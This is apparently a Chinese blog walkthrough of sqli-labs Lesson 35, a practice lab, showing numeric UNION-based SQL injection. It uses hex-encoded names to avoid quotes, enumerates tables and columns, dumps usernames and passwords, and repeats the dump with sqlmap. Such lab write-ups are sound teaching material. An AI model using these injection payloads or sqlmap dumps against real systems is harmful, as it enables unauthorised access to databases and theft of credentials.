---
title: sqli-labs lession-35 GET-不需要绕过AddSlashes-整型
date: 2018-10-15 19:48:11
tags: [sqli-labs]
categories: sql注入
---

## 登录界面

![001](/img/sql/Lesson-35/001.png)

## 分析

![002](/img/sql/Lesson-35/002.png)

数字型的注入是不需要用到双引号的,当遇到表名用双引号包起来的时候转成16进制编码的即可。

## 注入

### 判断注入类型

输入单引号报错

![003](/img/sql/Lesson-35/003.png)

![004](/img/sql/Lesson-35/004.png)

通过`http://192.168.75.132/sql/Less-35/?id=1 and 1=2`确定是数字型,如果是字符型应该像第一课一样显示出id=1的内容。

### 获取字段数

`http://192.168.75.132/sql/Less-35/?id=1 order by 3%23`

![005](/img/sql/Lesson-35/005.png)

### 获取数据库名

`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,2,3%23`

![006](/img/sql/Lesson-35/006.png)

`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(database()),3%23`

![007](/img/sql/Lesson-35/007.png)

### 获取表名

`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(table_name)from information_schema.tables where table_schema=0x7365637572697479),3%23`

其中原来的`'security'`用`0x7365637572697479`替代,绕过了使用单引号。

![008](/img/sql/Lesson-35/008.png)

### 获取列名

`users`用`0x7573657273`替代。

`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273),3%23`

![009](/img/sql/Lesson-35/009.png)

### 获取字段

`http://192.168.75.132/sql/Less-35/?id=-1 union select 1,(select group_concat(username,0x7e,password) from users),3%23`

![010](/img/sql/Lesson-35/010.png)

## SQLMAP

`sqlmap -u "http://192.168.75.132/sql/Less-35/?id=1" --dbms mysql -v 3 --technique E --flush-session --fresh-queries`

![011](/img/sql/Lesson-35/011.png)

![012](/img/sql/Lesson-35/012.png)

没什么好说的，直接上结果。

`sqlmap -u "http://192.168.75.132/sql/Less-35/?id=1" --dbms mysql -v 3 --technique E -D security -T users --columns --dump`

![013](/img/sql/Lesson-35/013.png)

![014](/img/sql/Lesson-35/014.png)



